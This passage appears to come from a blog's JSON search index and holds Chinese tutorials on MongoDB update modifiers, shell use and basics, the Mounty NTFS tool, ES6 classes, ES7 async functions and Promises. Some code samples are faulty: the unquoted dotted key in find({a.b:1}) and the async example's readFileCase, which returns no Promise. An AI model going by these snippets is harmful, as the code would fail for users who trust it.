a: 1 },{ a: 2 }); 但是真的如我们所示吗？其实结果并不是我们想要的，上面的代码执行后，其实文档更新后的结果为：\n{ a: 2 } 上面的执行代码覆盖了我们整个文档，当然这不是我们想要的结果。如果想要达到我们理想的结果，我们需要使用Mongodb提供的更新修改器(Update Modifier)。\n一个键只能存在一个更新修改器\n$inc修改器 $inc修改器主要是增对指定键的值进行增加值，$inc修改器是能操作数值类型值，这个修改器非常有用。比如下面，通过$inc修改器来计数访问统计。\n文档：\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 1 } 代码：\ndb.blog.update({ title: \u0026#39;analytics\u0026#39; },{ $inc: { analyticsCount: 1 //这里代表的是给analyticsCount键的值增加1 } }); 执行代码后文档为：\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 2 } $set修改器 和 $unset修改器 $set修改器的作用是重写一个键的值，注意这里是重写这个键的值，并不是增加。如果没有这个键则添加并设置值，比如给下面的文档添加一个page键并设置值为\u0026rsquo;index\u0026rsquo;。\n文档\n{ title: \u0026#39;analytics\u0026#39;, analyticsCount: 1 } 代码","title":"Mongodb更新修改器"},{"content":"前言 在前一章文章中提到了Mongodb提供了一个Javascript运行环境，这个运行环境我们通过mongo或者mongo.exe打开，这是一个独立的Mongodb客户端，打开它后会自动连接上本地端口为27017的数据库。\n如果你需要远程连接到其他数据库或者通过另外端口进行连接，可以通过--host xxxx来设置远程数据库的地址和通过--port来改变默认连接端口。\n运行mongod 打开mongo后会默认连接到test数据库，就像下图：\n在这个环境中我们可以使用Javascript的语法、原生方法、还可以编写函数来处理数据库，除此之外，这个Shell环境中还提供了Mongodb的一些操作语法，比如db,show dbs,show collections,insert等。下图显示了在Shell环境中运行Javascript代码以及一些常用的原生方法。\n需要注意Shell会检查Javascript代码是否完整，如果没有写完可以在下一行继续写，但是如果在写代码的过程中发现出现了问题需要取消，按三次回车键就可以取消当前语句执行。比如下图中我定义了一个变量c，但是没有赋值，我连续按三次回车键取消当前语句执行，当我再次使用变量c的时候提示c is not defined。\n简单的语句 在使用Shell环境的时候会用到几个简单的语句，其他的语句后面会慢慢的讲解。\ndb: db是一个全局变量，记录着当前所在的数据库名 show dbs: 列出当前连接的所有数据库名 use xxx: use语句后面跟一个数据库名称，可以改变当前所在的数据库 show collections: 显示当前数据库中所有的集合\n这里需要注意的是db变量是一个对象，里面包含这个数据库的信息，当我们直接输入db的时候，实际上返回的是db._name这个属性的值，而这个属性是保存着当前数据库名，下图是返回一个db变量的遍历信息：\n在Javascript中我们可以通过以下方式来获取对象的属性：\nvar a = { b: 2 } a.b; 那既然Shell是Mongodb提供的一个Javascript Shell，那么我们同样可以用这样的方式来访问集合，比如像下面这样\ndb.test 基本操作 上面一个章节说了可以通过.符号来访问对象的属性，那么通过这样的方式访问集合，而返回的同样是一个对象，这个对象本身包含了一些当前集合的信息，我们可以通过Obejct.getOwnPropertyNames(db.test)来遍历自身的属性名:\ndb对象和返回的集合对象继承了很多Mongodb提供的方法，我们可以通过db.help()和db.test.help()方法来查看可以使用的一些数据库操作方法。\ninsert方法 Mongodb给集合返回的对象提供了insert方法，以便给当前集合插入数据，insert接受一个对象作为参数。\ndb.test.insert({ a:1, b:2 }); find方法 Mongodb给集合返回的对象提供了find方法，以便对于当前集合进行搜索文档，find接受一个对象作为参数，这个对象包含你要查询的条件。\ndb.test.find({a:1}); //查询所有文档含有键值为a:1的文档，并返回符合的所有文档 db.test.find({a.b:1}); //查询所有文档含有子健b的a键并且值等于1，并返回符合的所有文档 db.test.findOne({a:1}); //查询所有文档含有键值为a:1的文档，并返回符合的第一个文档 update方法 Mongodb给集合返回的对象提供了update方法，用于更新(修改)符合查询条件的文档，update接受两个参数，第一个是查询需要更新文档的条件，第二个参数是需要更新的内容。\ndb.test.update({a: 1}, {a: 2}); //查询所有文档中键值为a:1的文档，并修改为为a:2 remove方法 Mongodb给集合返回的对象提供了remove方法，用于删除符合查询条件的文档。接受一个参数，这个参数为一个参数条件\ndb.test.remove({a:1}); //查询所有文档中含有键值为a:1的文档，并删除 执行脚本 前言 Mongodb执行外部JS文件首先会查找JS文件，如果没有指定一个绝对路径的JS文件，那么它会查找shell的执行目录。\n使用mongo执行外部js Mongodb提供了一个执行外部JS文件的方式，在这个方式中所有的方法语句全部按照js来执行，比如mongo环境中执行的几个语句被替换为：\nuse test 替换为 db.getSisterDb('test') show dbs 替换为 db.getMongo().getDBs() show collections 替换为 db.getCollectionNames() 在外面JS文件中使用connect('localhost:27017/test')来创建一个数据库连接，并返回db对象 获取一个集合的对象可以使用db.a操作符或者使用db[a]数组访问语法，或者使用db.getCollection('a')都可以达到相同的效果 大概使用方法像下面这样：\nmongo 1.js; JS文件内部如果想要打印数据，需要使用标准的输出库来输出内容print()。既然能从标准库输出内容，那么我们也就能通过管道命令来继续我们的操作，比如数据备份是一个js文件，而打包是一个js文件，这样就很符合前端的模块化不是吗？管道操作通过参数--quiet。\n我们经常会遇见在本地写好执行文件，然后到服务器上执行，比如说备份，但是Mongodb提供了一个非常好用的端口，可以直接指定远程端服务器的地址端口然后执行本地JS文件。使用方式是大概如下：\nmongo wuyizhou.com:28011/blog backup.js 在Javascript Shell环境中执行外部js Mongodb在Shell环境中提供了load()方法来在环境中加载外部JS文件，并且JS的代码作用于当前的shell环境中，也就是说我们外面JS文件声明了一个函数a，那么执行完后，在当前的shell环境中这个函数a是存在的。这样我们就很方便的可以把我们定义的一些方法函数加载进来。下面的代码在Shell环境中。\nload(\u0026#39;1.js\u0026#39;); 创建.mongorc.js文件 这个文件的作用是在Shell启动的时候自动加载一些设置配置，这样我们就可以在这个文件当中编写一些我们常用的方法、函数。\n当然这个文件还有一个用处就是可以重写一些危险的方法，这样就避免的程序的误操作等问题。比如下面删除数据库的一个方法。\n.mongorc.js\ndb.dropDatabase = function(){ print(\u0026#39;不能使用此操作!\u0026#39;); } 通过上面的方法，每次使用db.dropDatabase操作的时候就会输出不能使用此操作!的内容。\n修改默认的编辑器 在Shell中可以设置EDITOR变量修改默认的编辑器，然后使用edit命令后面跟相应的文档来编辑，比如下面这样：\nEDITOR=\u0026#34;/usr/bin/vim\u0026#34;; var a = db.test.find({a: 1}); edit a; 当然你可以把这个变量写在.mongorc.js文件中，让每次加载shell的时候就自动更改默认编辑器\n关闭Javascript执行 如果需要完全关闭Javascript的执行功能只需要在启动mongodb的时候加上一个参数就可以了，这个参数为--noscripting\n参考 MongoDB权威指南(第2版)\n文完\n","permalink":"/posts/mongodb-shell/","summary":"前言 在前一章文章中提到了Mongodb提供了一个Javascript运行环境，这个运行环境我们通过mongo或者mongo.exe打开，这是一个独立的Mongodb客户端，打开它后会自动连接上本地端口为27017的数据库。\n如果你需要远程连接到其他数据库或者通过另外端口进行连接，可以通过--host xxxx来设置远程数据库的地址和通过--port来改变默认连接端口。\n运行mongod 打开mongo后会默认连接到test数据库，就像下图：\n在这个环境中我们可以使用Javascript的语法、原生方法、还可以编写函数来处理数据库，除此之外，这个Shell环境中还提供了Mongodb的一些操作语法，比如db,show dbs,show collections,insert等。下图显示了在Shell环境中运行Javascript代码以及一些常用的原生方法。\n需要注意Shell会检查Javascript代码是否完整，如果没有写完可以在下一行继续写，但是如果在写代码的过程中发现出现了问题需要取消，按三次回车键就可以取消当前语句执行。比如下图中我定义了一个变量c，但是没有赋值，我连续按三次回车键取消当前语句执行，当我再次使用变量c的时候提示c is not defined。\n简单的语句 在使用Shell环境的时候会用到几个简单的语句，其他的语句后面会慢慢的讲解。\ndb: db是一个全局变量，记录着当前所在的数据库名 show dbs: 列出当前连接的所有数据库名 use xxx: use语句后面跟一个数据库名称，可以改变当前所在的数据库 show collections: 显示当前数据库中所有的集合\n这里需要注意的是db变量是一个对象，里面包含这个数据库的信息，当我们直接输入db的时候，实际上返回的是db._name这个属性的值，而这个属性是保存着当前数据库名，下图是返回一个db变量的遍历信息：\n在Javascript中我们可以通过以下方式来获取对象的属性：\nvar a = { b: 2 } a.b; 那既然Shell是Mongodb提供的一个Javascript Shell，那么我们同样可以用这样的方式来访问集合，比如像下面这样\ndb.test 基本操作 上面一个章节说了可以通过.符号来访问对象的属性，那么通过这样的方式访问集合，而返回的同样是一个对象，这个对象本身包含了一些当前集合的信息，我们可以通过Obejct.getOwnPropertyNames(db.test)来遍历自身的属性名:\ndb对象和返回的集合对象继承了很多Mongodb提供的方法，我们可以通过db.help()和db.test.help()方法来查看可以使用的一些数据库操作方法。\ninsert方法 Mongodb给集合返回的对象提供了insert方法，以便给当前集合插入数据，insert接受一个对象作为参数。\ndb.test.insert({ a:1, b:2 }); find方法 Mongodb给集合返回的对象提供了find方法，以便对于当前集合进行搜索文档，find接受一个对象作为参数，这个对象包含你要查询的条件。\ndb.test.find({a:1}); //查询所有文档含有键值为a:1的文档，并返回符合的所有文档 db.test.find({a.b:1}); //查询所有文档含有子健b的a键并且值等于1，并返回符合的所有文档 db.test.findOne({a:1}); //查询所有文档含有键值为a:1的文档，并返回符合的第一个文档 update方法 Mongodb给集合返回的对象提供了update方法，用于更新(修改)符合查询条件的文档，update接受两个参数，第一个是查询需要更新文档的条件，第二个参数是需要更新的内容。\ndb.test.update({a: 1}, {a: 2}); //查询所有文档中键值为a:1的文档，并修改为为a:2 remove方法 Mongodb给集合返回的对象提供了remove方法，用于删除符合查询条件的文档。接受一个参数，这个参数为一个参数条件\ndb.test.remove({a:1}); //查询所有文档中含有键值为a:1的文档，并删除 执行脚本 前言 Mongodb执行外部JS文件首先会查找JS文件，如果没有指定一个绝对路径的JS文件，那么它会查找shell的执行目录。","title":"Mongodb Shell"},{"content":"参考 MongoDB权威指南(第2版)\n前言 Mongodb是一种面向文档的数据库，并非关系型数据库(如Mysql等)，Mongodb的出现也让前端后端更加的统一，因为它的数据结构非常类似于Javascript中的对象。比如说下面，在Javascript中代表对象，在Mongodb中代表的就是一个文档。\n{ a: 1, b: 2 } 如果我们全栈都是使用的Javascript(Javascript+Nodejs+Mongodb)那么将更加提高我们的便利以及统一性。\n如果你之前使用的是Mysql等关系型数据库，那么可能需要对Mongodb数据库的观念要有所改变，在Mongodb中没有行和列，取而代之的是文档。在Mongodb中也没有表的存在，取而代之的是集合。\n每一个文档都有一个_id用于表示这个文档的唯一性，并且Mongodb提供了一个Javascript Shell，我们可以通过Javascript语法来管理操作等方式来控制数据库，这也为我们的全栈更大一步的增加了统一性。\n数据库(Database) 在一个数据库中是可以存在多个集合，\n集合(Collection) 相当关系型数据库中的表。\n文档(Document) 在Javascript中，一个对象的值可以是一个对象、数组、基本值、函数等。当然这也可以用在文档上。比如下面的一个结构，是一个完全合法的文档结构\n{ a: { b: 1 c: [1,2,3] }, d: 1 } Mongodb区分类型，也通用区分大小写，比如下面是两个不同的文档\n{\u0026#39;a\u0026#39;: 1} {\u0026#39;A\u0026#39;: 1} 命名规则 集合 集合使用名称来进行识别，但是集合名应该避免下列的情况：\n不能是空字符串 不能包含(空字符)，因为在Mongodb中表示为集合名结束 不能以system开头，因为这是系统保留的前缀，比如system.users这个集合保存着数据库的用户信息，而system.namespaces集合保存着数据库中所有集合的信息。 避免使用$，因为系统生成的集合当中很多包含有$字符串，所以你应当避免。 数据库 数据库使用名称来进行识别，但是集合名应该避免下列的情况：\n不能是空字符串 不能使用特殊符号 ,/,.,*等符号，尽量使用由字母和数字组成的字符串。 数据库名区分大小写 数据库名最多为64字节 有三个系统的数据库，如admin,local,config。应避免这三个名称当作你的数据库名 启动Mongodb 你可以通过Mongodb官方网站来下载Mongodb，如果你是windows，可能会安装得到一个安装包，安装完成后你就可以直接在CMD命令行通过mongod来启动Mongodb。如果是*inux系统，下载了Mongodb后得到解压包解压后直接运行当前目录的mongod就可以启动Mongodb。\n这里需要注意的是需要通过参数--dbpath来指定Mongodb数据库的位置，如果没有指定，那么Mongodb会默认目录/data/db，windows为c:/data/db。\n默认情况下Mongodb会以27017端口为默认端口，并且给当前端口提供了一个http服务器，你用浏览器打开，它会提示你下图的信息。\n如果你需要通过http端口来获取一些Mongodb的状态信息，那么你需要增加一个参数--httpinterface来打开http接口，这个http一般会比监听的数据库端口大1000。比如27017是数据库默认监听借口，那么http服务的端口为28017。你用浏览器打开这个页面，就会出现如下图\n如果你需要一些命令操作，比如列举一些信息，那么你还需要增加--rest参数。\n文完\n","permalink":"/posts/mongodb/","summary":"参考 MongoDB权威指南(第2版)\n前言 Mongodb是一种面向文档的数据库，并非关系型数据库(如Mysql等)，Mongodb的出现也让前端后端更加的统一，因为它的数据结构非常类似于Javascript中的对象。比如说下面，在Javascript中代表对象，在Mongodb中代表的就是一个文档。\n{ a: 1, b: 2 } 如果我们全栈都是使用的Javascript(Javascript+Nodejs+Mongodb)那么将更加提高我们的便利以及统一性。\n如果你之前使用的是Mysql等关系型数据库，那么可能需要对Mongodb数据库的观念要有所改变，在Mongodb中没有行和列，取而代之的是文档。在Mongodb中也没有表的存在，取而代之的是集合。\n每一个文档都有一个_id用于表示这个文档的唯一性，并且Mongodb提供了一个Javascript Shell，我们可以通过Javascript语法来管理操作等方式来控制数据库，这也为我们的全栈更大一步的增加了统一性。\n数据库(Database) 在一个数据库中是可以存在多个集合，\n集合(Collection) 相当关系型数据库中的表。\n文档(Document) 在Javascript中，一个对象的值可以是一个对象、数组、基本值、函数等。当然这也可以用在文档上。比如下面的一个结构，是一个完全合法的文档结构\n{ a: { b: 1 c: [1,2,3] }, d: 1 } Mongodb区分类型，也通用区分大小写，比如下面是两个不同的文档\n{\u0026#39;a\u0026#39;: 1} {\u0026#39;A\u0026#39;: 1} 命名规则 集合 集合使用名称来进行识别，但是集合名应该避免下列的情况：\n不能是空字符串 不能包含(空字符)，因为在Mongodb中表示为集合名结束 不能以system开头，因为这是系统保留的前缀，比如system.users这个集合保存着数据库的用户信息，而system.namespaces集合保存着数据库中所有集合的信息。 避免使用$，因为系统生成的集合当中很多包含有$字符串，所以你应当避免。 数据库 数据库使用名称来进行识别，但是集合名应该避免下列的情况：\n不能是空字符串 不能使用特殊符号 ,/,.,*等符号，尽量使用由字母和数字组成的字符串。 数据库名区分大小写 数据库名最多为64字节 有三个系统的数据库，如admin,local,config。应避免这三个名称当作你的数据库名 启动Mongodb 你可以通过Mongodb官方网站来下载Mongodb，如果你是windows，可能会安装得到一个安装包，安装完成后你就可以直接在CMD命令行通过mongod来启动Mongodb。如果是*inux系统，下载了Mongodb后得到解压包解压后直接运行当前目录的mongod就可以启动Mongodb。\n这里需要注意的是需要通过参数--dbpath来指定Mongodb数据库的位置，如果没有指定，那么Mongodb会默认目录/data/db，windows为c:/data/db。\n默认情况下Mongodb会以27017端口为默认端口，并且给当前端口提供了一个http服务器，你用浏览器打开，它会提示你下图的信息。\n如果你需要通过http端口来获取一些Mongodb的状态信息，那么你需要增加一个参数--httpinterface来打开http接口，这个http一般会比监听的数据库端口大1000。比如27017是数据库默认监听借口，那么http服务的端口为28017。你用浏览器打开这个页面，就会出现如下图\n如果你需要一些命令操作，比如列举一些信息，那么你还需要增加--rest参数。\n文完","title":"Mongodb基础知识"},{"content":"前言 在Mac上面访问NTFS格式的移动设备或者分区很简单，但是如果你要对NTFS进行写操作，就得使用其他的方式，比如打开Mac自身支持NTFS的读写 、购买付费软件NTFS For Mac 、Paragon NTFS等，还或者通过免费软件，比如下面要介绍的一款Mounty。\n通过终端工具等系统命令操作很麻烦，特别是对不懂命令行的人来说更加头疼。如果是付费软件那么你就得支持一笔费用，此费用还不小，每当Macos或者付费软件版本大更新的时候就会进行一次更新，那这次更新当然不是免费的，你还得付费这次的升级费用。\n我找了很多个免费的NTFS读写工具，终于找到了一款非常满意的NTFS读写工具并且支持中文，但是存在一些小问题，可能不该叫它工具，该叫App。如果你觉得好用，我非常赞同你支持开发者捐赠费用，通过下图所标记的地方进行捐赠\n使用 Mounty是一个完全免费的App，通过Mounty的官方网站下载，你可以在右侧的Get: Click to install栏目找到下载方式。\n下面后是一个DMG文件，双击打开它，你就会看到它只是一个App，把它拖移到Applications下面\n然后在你的Launchpad找到它并打开它，打开过后它没有单独的一个App界面，它会在你上方的工具栏中显示一个小图标，图标中有一个字母M，就如下图一样\n如果你需要让Mounty每次启动，那么你需要点击图片弹出了一个菜单，你只需要点击开机时自启动，比如下图\n打开Mounty后你就不需要做什么操作了，你只需要把你要读写的NTFS格式的设备插上你的电脑，它会自动监测。当我们插入U盘过后，它会提示你如下图中所示\n如果你不需要写操作，只需要点击不用了,谢谢，如果你需要读写操作，点击是的，当然！就可以进行读写操作了。\nBUG 在新的MacOS 10.12.5系统中会存在一些BUG\n当我们要进行读写操作的时候，在MacOS自带的Finder资源管理器中，无法找到我们的移动设备，只能通过点击图标，有一个在Finder中显示，才能进行管理文件。并且卸载移动设备也只能通过点击图片卸载，如果只是读操作，那么在Finder中能找到此移动设备。\n当我们插入U盘的时候能够识别移动设备的标识符，但是当我们选择读写操作的时候，那么在图标上无法显示移动设备标识符，就像下图一样，所以当我们插入多个移动设备的时候我们可能得挨个点击在Finder中显示来辨别哪个移动设备。目前已经有认给官方反应了，很快官方也会作出更新。\n文完\n","permalink":"/posts/mounty-software/","summary":"前言 在Mac上面访问NTFS格式的移动设备或者分区很简单，但是如果你要对NTFS进行写操作，就得使用其他的方式，比如打开Mac自身支持NTFS的读写 、购买付费软件NTFS For Mac 、Paragon NTFS等，还或者通过免费软件，比如下面要介绍的一款Mounty。\n通过终端工具等系统命令操作很麻烦，特别是对不懂命令行的人来说更加头疼。如果是付费软件那么你就得支持一笔费用，此费用还不小，每当Macos或者付费软件版本大更新的时候就会进行一次更新，那这次更新当然不是免费的，你还得付费这次的升级费用。\n我找了很多个免费的NTFS读写工具，终于找到了一款非常满意的NTFS读写工具并且支持中文，但是存在一些小问题，可能不该叫它工具，该叫App。如果你觉得好用，我非常赞同你支持开发者捐赠费用，通过下图所标记的地方进行捐赠\n使用 Mounty是一个完全免费的App，通过Mounty的官方网站下载，你可以在右侧的Get: Click to install栏目找到下载方式。\n下面后是一个DMG文件，双击打开它，你就会看到它只是一个App，把它拖移到Applications下面\n然后在你的Launchpad找到它并打开它，打开过后它没有单独的一个App界面，它会在你上方的工具栏中显示一个小图标，图标中有一个字母M，就如下图一样\n如果你需要让Mounty每次启动，那么你需要点击图片弹出了一个菜单，你只需要点击开机时自启动，比如下图\n打开Mounty后你就不需要做什么操作了，你只需要把你要读写的NTFS格式的设备插上你的电脑，它会自动监测。当我们插入U盘过后，它会提示你如下图中所示\n如果你不需要写操作，只需要点击不用了,谢谢，如果你需要读写操作，点击是的，当然！就可以进行读写操作了。\nBUG 在新的MacOS 10.12.5系统中会存在一些BUG\n当我们要进行读写操作的时候，在MacOS自带的Finder资源管理器中，无法找到我们的移动设备，只能通过点击图标，有一个在Finder中显示，才能进行管理文件。并且卸载移动设备也只能通过点击图片卸载，如果只是读操作，那么在Finder中能找到此移动设备。\n当我们插入U盘的时候能够识别移动设备的标识符，但是当我们选择读写操作的时候，那么在图标上无法显示移动设备标识符，就像下图一样，所以当我们插入多个移动设备的时候我们可能得挨个点击在Finder中显示来辨别哪个移动设备。目前已经有认给官方反应了，很快官方也会作出更新。\n文完","title":"Mac软件推荐-Mounty"},{"content":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 ES6提供了Class语句用于更的理解语义以及更接近传统的编程语言的写法。Class可以当作ES5构造函数的一个语法糖。\n传统的构造函数以及继承方法如下面这样来写的：\nfunction Getname() { this.name = \u0026#39;wyz\u0026#39;; this.age = \u0026#39;29\u0026#39;; } // 如果我们需要定义一个给所有基于Getname构造函数使用的方法 // 那么我们必须通过prototype对象上定义 Getname.prototype.getName = function(){ return (`Name: ${this.name}, Age: ${this.age}`); } let gname = new Getname(); gname.getName(); //\u0026#34;Name: wyz, Age: 29\u0026#34; 通过上面的方法来创建一个“类”，对比其他语言是差距很大的，而且很难理解，ES6提供了一个新的语句Class来创建类。\nclass Getname{ constructor(){ this.name = \u0026#39;wyz\u0026#39;; this.age = \u0026#39;29\u0026#39;; } getName(){ return (`Name: ${this.name}, Age: ${this.age}`); } } let gname = new Getname(); gname.getName(); //\u0026#34;Name: wyz, Age: 29\u0026#34; 通过ES6的Class语句更能清晰的表达出类，这与传统的语言声明类很相似。在class中，constructor方法是一个构造函数，类似于我们构造函数中编写给实例初始化的一些属性方法，而在constructor之外定义的方法都是定义在原型上面的公用方法，这就很能理解为什么Class是构造函数的语法糖了。\ngname.constructor === Getname; // true gname.getName === Getname.prototype.getName; // true 在使用Class语句的时候，需要注意下面几个点：\n在定义类的时候，方法与方法之间不需要逗号间隔，在定语方法的前面也不需要添加function关键字。 在使用定义类之前需要实例化，并且需要加上new关键字，这与构造方法一致。 类的所有方法都是定义在prototype属性上的，并且可以通过__proto__访问，同时也可以直接在上面对类进行添加方法。 一个方法必须有constructor，如果没有，会默认添加一个空的constructor。并且constructor默认返回实例对象即实例对象的指针this，我们可以显示的使用return语句改变默认动作。 类必须要使用前定义，不存在变量提升。 类的内部使用严格运行模式。 子类同时具备prototype和__proto__。__proto__指向父类，而prototype的__proto__属性，指向父类的原型也就是父类的prototype属性。 继承 Class之间的继承通过extends关键字来实现，这对比es5复杂的修改原型要容易得多，需要注意的是子类并没有this指针，子类的this是通过先调用父类的构造方法得到this然后在上面加工，所以在子类使用this指针前必须使用调用父类的构造方法。\n这与es5的构造函数不一样，es5是先创建子类的this，然后在这个this上面添加方法与属性。\n一个子类通过在构造方法中使用super()来调用父类构造方法创建this，如果没有只有constructor没有super()，那么将会在实例的时候出错，如果即没有constructor和super()，那么会默认添加上。\nclass Getname{ constructor(){ this.name = \u0026#39;wyz\u0026#39;; this.age = \u0026#39;29\u0026#39;; } getName(){ return (`Name: ${this.name}, Age: ${this.age}`); } } class Getall extends Getname{ constructor(){ super(); this.gender = \u0026#39;male\u0026#39;; } getAll(){ return (`Name: ${this.name}, Age: ${this.age}, Gender: ${this.gender}`); } } let m = new Getall(); //继承了父类的初始化值。name: \u0026#34;wyz\u0026#34;, age: \u0026#34;29\u0026#34;, gender: \u0026#34;male\u0026#34; m.getName(); //使用父类的方法。Name: wyz, Age: 29 Object.getPrototypeOf() Object.getPrototypeOf()方法的作用是从子类上获取父类，那么就可以把这个方法拿来判断一个子类是否继承于一个类\nObject.getPrototypeOf(Getall) === Getname; //true 类的静态方法 在定义类中的所有方法都是定义在prototype属性上的，那么就意味着所有的方法都会被继承，那如何来定义一个不被实例继承，而只能通过类本身调用的静态方法？ES6提供了static关键字。在需要不被继承静态方法前，但这个静态方法会被子类继承，因为子类的**proto**总是指向父类。\nclass Foo { static classMethod() { return \u0026#39;hello\u0026#39;; } } let foo = new Foo(); foo.classMethod(); //foo.classMethod is not a function class Fow extends Foo { } Fow.classMethod(); // \u0026#39;heelo\u0026#39; Fow.__proto__.classMethod === Foo.classMethod; //true 类的静态属性 ES6只定义了类的静态方法并没有定义类的静态属性，所以如果要定义类的静态属性只能通过下面这样来定义：\nclass Foo{ } Foo.name = \u0026#39;wyz\u0026#39;; 但是ES7提出了一个议案，可以直接通过static关键字来定义类的静态属性，目前babel已经支持了。\nclass Foo{ static name = \u0026#39;wyz\u0026#39;; } 文完\n","permalink":"/posts/es6-class/","summary":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 ES6提供了Class语句用于更的理解语义以及更接近传统的编程语言的写法。Class可以当作ES5构造函数的一个语法糖。\n传统的构造函数以及继承方法如下面这样来写的：\nfunction Getname() { this.name = \u0026#39;wyz\u0026#39;; this.age = \u0026#39;29\u0026#39;; } // 如果我们需要定义一个给所有基于Getname构造函数使用的方法 // 那么我们必须通过prototype对象上定义 Getname.prototype.getName = function(){ return (`Name: ${this.name}, Age: ${this.age}`); } let gname = new Getname(); gname.getName(); //\u0026#34;Name: wyz, Age: 29\u0026#34; 通过上面的方法来创建一个“类”，对比其他语言是差距很大的，而且很难理解，ES6提供了一个新的语句Class来创建类。\nclass Getname{ constructor(){ this.name = \u0026#39;wyz\u0026#39;; this.age = \u0026#39;29\u0026#39;; } getName(){ return (`Name: ${this.name}, Age: ${this.age}`); } } let gname = new Getname(); gname.getName(); //\u0026#34;Name: wyz, Age: 29\u0026#34; 通过ES6的Class语句更能清晰的表达出类，这与传统的语言声明类很相似。在class中，constructor方法是一个构造函数，类似于我们构造函数中编写给实例初始化的一些属性方法，而在constructor之外定义的方法都是定义在原型上面的公用方法，这就很能理解为什么Class是构造函数的语法糖了。","title":"ES6-Class类"},{"content":"参考文档：MDN\n概念 ES7提供了一个异步解决方案async函数容易，它的作用非常简单，几个异步操作并且这几个是有依赖的，如果按照我们往常的使用方法有几种，下面是一个读取文件的例子，需要读取文件1-3.txt，首先看看callback的写法：\nreadFile(\u0026#39;1.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} let data1 = data; readFile(\u0026#39;2.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err } let data2 = data; readFile(\u0026#39;3.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} let data3 = data; return dataAll = data1.toString() + data2.toString() + data3.toString(); }); }); }); 从上面的代码看出来，这样的回调函数很难辨别，也很难理解，而且多个回调函数嵌套，编写代码的人员也过后回头看也会感觉到头疼，这就是我们常说的\u0026quot;callback hell\u0026quot;。下面还有一种Promise的写法：\nvar files1 = new Promise((resolve, reject) =\u0026gt; { readFile(\u0026#39;1.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} resolve(data); }); }); var files2 = new Promise((resolve, reject) =\u0026gt; { readFile(\u0026#39;2.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} resolve(data); }); }); var files3 = new Promise((resolve, reject) =\u0026gt; { readFile(\u0026#39;3.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} resolve(data); }); }); files1.then((data1) =\u0026gt; { files2.then((data2) =\u0026gt; { files3.then((data3) =\u0026gt; { /* Code */ }); }); }); 当然还有其他的写法，Promise+Generator、co模块、Thunk函数等方法，但是我觉得ES7提出的async是解决异步编程的终极方案，非常容易理解语义，写起来思路也非常清晰，async通过async命令来标识这是一个async函数，通过在函数内部用await标识这是一个需要等待执行完毕的异步操作。在使用async之前有几点需要先了解一下:\n非常容易理解的语义，在函数前加上async标注这是一个异步函数容器。async翻译过来为异步。\n在async内部通过await标注这个操作需要等待执行完毕后才执行下一个操作。await翻译过来为等待\nasync函数内部通过return语句返回值，用于then方法的回调函数参数\nasync函数返回一个Promise对象，并且这个Promise对象的状态是等待所有await命令执行完毕后才凝固。\n只要async函数内部的await命令后面发生了错误，就会触发rejected状态，并且被外部的catch方法回调函数捕获。\nawait语句后面的是一个Promise对象，如果不是就转换为Promise对象\n用法 下面来看看用async来实现上面的代码\nfunction readFileCase(fileanme){ readFile(\u0026#39;1.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} return data; }) } async function files(){ let data1 = await readFileCase(\u0026#39;1.txt\u0026#39;); let data2 = await readFileCase(\u0026#39;2.txt\u0026#39;); let data3 = await readFileCase(\u0026#39;3.txt\u0026#39;); return (data1.toString() + data2.toString() + data3.toString()); } files() .then((data) =\u0026gt; { console.log(data); }) .catch((err) =\u0026gt; { console.log(err); }); 上面的例子先定义了一个函数来封装readFile函数，返回一个data值。async函数内部，在需要等待异步操作执行函数的前面添加await语句，使用async函数来操作异步编程语义非常清晰。 文完\n","permalink":"/posts/es7-async/","summary":"参考文档：MDN\n概念 ES7提供了一个异步解决方案async函数容易，它的作用非常简单，几个异步操作并且这几个是有依赖的，如果按照我们往常的使用方法有几种，下面是一个读取文件的例子，需要读取文件1-3.txt，首先看看callback的写法：\nreadFile(\u0026#39;1.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} let data1 = data; readFile(\u0026#39;2.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err } let data2 = data; readFile(\u0026#39;3.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} let data3 = data; return dataAll = data1.toString() + data2.toString() + data3.toString(); }); }); }); 从上面的代码看出来，这样的回调函数很难辨别，也很难理解，而且多个回调函数嵌套，编写代码的人员也过后回头看也会感觉到头疼，这就是我们常说的\u0026quot;callback hell\u0026quot;。下面还有一种Promise的写法：\nvar files1 = new Promise((resolve, reject) =\u0026gt; { readFile(\u0026#39;1.txt\u0026#39;, (err, data) =\u0026gt; { if(err) {return err} resolve(data); }); }); var files2 = new Promise((resolve, reject) =\u0026gt; { readFile(\u0026#39;2.","title":"ES7-async函数"},{"content":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 Promise最初在社区提出的一个异步解决的方案，最后ES6将它加入了正式的标准，并规定了统一的写法。\n在使用Promise之前，你需要注意下面几个点：\n1.Promise有三个状态:Pending(进行中)、Resolved(已完成)、Rejected(已失败)，这三个状态我们无法去改变，并且在一个Promise中只有两个可能，一种是从Pending到Resolved，另一种是Pending到Rejected。当结果发生后，这个状态就凝固了，也就是说我们无法去改变Promise对象的任何状态，如果再次调用这个Promise对象，返回的将是凝固状态的结果。\n2.Promise在执行的过程中无法取消，并且我们也无法知道它执行到哪一步，我们只能知道返回的是已完成还是已失败。\n3.Promise实例创建后会立即执行\n下面的代码部署了一个Promise对象异步加载图片的例子，可以看到用Promise对象来编写异步代码是非常的清晰。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); 在部署了Promise对象后，我们可以通过Promise的实例来调用then()方法，then()方法接受两个函数，这两个函数分别指定resolved和rejected状态返回的回调函数。第二个函数可以不指定，也就是说不返回错误，只得到完成的结果。\nvar imgs = new 